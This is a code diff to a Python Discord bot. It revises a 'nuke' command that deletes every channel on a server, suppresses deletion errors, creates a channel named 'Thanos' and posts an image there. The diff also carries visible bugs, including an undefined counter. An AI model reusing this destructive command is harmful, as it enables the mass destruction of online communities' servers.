@@ -110,13 +110,26 @@ async def nuke(ctx):
     await bot.say("1")
     await asyncio.sleep(1)
     await bot.say("0")
-    for i in ctx.message.server.channels:
-        x=x+1
-        await bot.say(("nuking {}").format(i))
-        await bot.delete_channel(i)
+    
+    channels = []
+    
+    for x in ctx.message.server.channels:
+        h=h+1
+        channels.append(x)
+        
+    for i in channels:
+        try:
+            await bot.delete_channel(i)
+        except Exception:
+            print("Channel couldn't be deleted: {}".format(i))
+            pass
+        
+    e = await bot.create_channel(ctx.message.server,"Thanos", type=discord.ChannelType.text)
     await bot.say(("{} Channels Have Been Nuked").format(x))
-    await bot.create_channel(ctx.message.server,"Thanos", type=discord.ChannelType.text)
-    await bot.send_file(ctx.message.channel,"thanus.png")
+    await bot.send_file(e,"thanus.png")
+    
+    
+    #nuke
     
 @bot.event
 async def on_member_join(member):
